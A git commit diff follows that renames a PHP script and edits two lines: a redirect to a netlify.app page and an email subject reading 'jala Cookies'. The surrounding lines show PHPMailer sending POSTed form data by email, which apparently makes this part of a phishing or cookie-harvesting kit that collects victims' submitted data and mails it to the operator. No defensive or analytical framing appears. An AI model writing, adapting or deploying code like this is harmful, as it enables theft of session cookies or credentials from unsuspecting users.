6c643d937aa1bf875eae42002e87672ca23d88d1
Uzr44911 <ahmjtalijaan@gmail.com>
2025-08-07 11:58:11 +0500

    Update and rename Sarj.php to Jala.php

--- Jala.php
+++ Jala.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location: https://splendid-mousse-f64923-page-hello.netlify.app/");
+header("Location: https://curious-tartufo-e2672f.netlify.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'sarj Cookies';
+        $mail->Subject = 'jala Cookies';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
         // Send email
